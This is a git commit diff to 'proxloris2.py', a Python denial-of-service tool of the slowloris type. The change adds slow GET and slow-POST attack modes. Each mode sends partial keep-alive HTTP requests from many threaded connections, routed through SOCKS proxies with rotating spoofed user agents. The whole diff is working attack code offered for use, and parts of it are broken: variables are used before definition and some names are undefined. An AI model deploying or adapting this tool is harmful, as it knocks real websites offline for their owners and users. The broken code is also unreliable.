580d500fa6b499a640ad5b2b45a37abdcba43d45
the.infodox <the.infodox@gmail.com>
2012-02-14 17:27:27 +0000

    Modified proxloris

--- proxloris2.py
+++ proxloris2.py
@@ -14,34 +14,20 @@ except:
     wrap_socket = socket.ssl
 
 
-useragents = [
- "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
- "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
- "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
- "Opera/9.20 (Windows NT 6.0; U; en)",
- "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
- "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
- "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
- "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
- "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
- "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
- "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
- "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
- "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
- "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
- "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
- "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
- "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
- "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
- "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
- "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
-]
+ualist = []
+
+def load_useragents():
+    if os.path.isfile('./ualist.txt'):
+        for f in open('./ualist.txt', 'r'):
+            ualist.append(f)
+
+load_useragents()
 
 #---------------------------------{ global }-------------------------------#
 siteHost = ''
 sitePort = 80
 pInstance = 30 #use single proxy how many times?
-userAgent = random.choice(useragents)
+userAgent = random.choice(ualist)
 #--------------------------------------------------------------------------#
 
 s5list = []
@@ -53,7 +39,7 @@ def notice(msg):
     print '[+] ' + msg
     
 def error(msg):
-	print '[-] ' + msg
+    print '[-] ' + msg
         
     
 
@@ -77,21 +63,29 @@ class http_drone:
         self.sckt.close()
     
     def conn(self):
-        
         try:
             self.sckt.connect((siteHost, sitePort))
         except:
             return
-
-        x = random.randint(10000, 100000)
-
-# The "payload" here is the GET payload...
-        payload = 'GET /' + str(x) + ' HTTP/1.1\r\nHost: ' + siteHost + '\r\n' + 'User-Agent: ' + userAgent + '\r\n' + 'Content-Length: 36\r\n'
-        fs = self.sckt.makefile()
-        
-        #payloadPOST
-        #payload = 'POST ' + targetpage + targetvar + str(x) + ' HTTP/1.1\r\nHost: ' + siteHost + ' \r\n' + 'User-Agent: ' + userAgent + '\r\n' + 'Connection: keep-alive\r\n' + 'Keep-Alive: 900\r\n' + 'Content-Length: 10000\r\n' + 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
-        # In this case X is just a SHITLOAD of junk. About 10000 random bits of shit
+        if attack == loris:
+            req = 'GET /' + x + ' HTTP/1.1\r\n'
+        elif attack == post:
+            req = 'POST /' + page + param + x + ' HTTP/1.1\r\n'
+        else:
+            print("No Legit Attack Selected! Fuck off and try again!")
+            sys.exit(1)    
+        x = os.urandom(6000)    
+        payload = req
+        payload += 'Host: ' + target + '\r\n'
+        payload += 'User-Agent: ' + userAgent + '\r\n'
+        payload += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
+        payload += 'Accept-Language: en-us,en;q=0.5\r\n'
+        payload += 'Accept-Encoding: gzip,deflate\r\n'
+        payload += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
+        payload += 'Keep-Alive: 900\r\n'
+        payload += 'Connection: keep-alive\r\n'
+        payload += 'Content-Type: application/x-www-form-urlencoded\r\n'
+        payload += 'Content-length: 6000\r\n\r\n'
 
         while 1:
             time.sleep(2.7)
@@ -126,8 +120,8 @@ class http_drone:
         
         self.sckt = s
 
-#                  if self.options['ssl'] ==  True: # THIS BIT HANDLES SSL
-#                        wrap_socket(s)             # well, I hope it WILL...
+        if self.options['ssl'] ==  True: # THIS BIT HANDLES SSL
+            wrap_socket(s)             # well, I hope it WILL...
         
         threading.Thread(target=self.conn, args=()).start()
 
@@ -160,6 +154,11 @@ def load_proxies():
 
 print "ProxLoris"
 
+status = "blah"
+
+def output_status(status):
+    print(status)
+
 gtg = 1
 
 if(len(sys.argv) == 2):
@@ -171,6 +170,11 @@ elif(len(sys.argv) == 4):
     siteHost = sys.argv[1]
     pInstance = int(sys.argv[2])
     sitePort = int(sys.argv[3])
+elif(len(sys.argv) == 5):
+    siteHost = sys.argv[1]
+    pInstance = int(sys.argv[2])
+    sitePort = int(sys.argv[3])
+    attack = sys.argv[4]
 else:
     error("Needs Arguements")
     print("Usage: <Target> <ProxyReuse> <port> ")
@@ -181,4 +185,5 @@ if gtg > 0:
     load_proxies()
 
     for i in range(0, pInstance):
+#		output_status(createstatus)
         fork_drones()
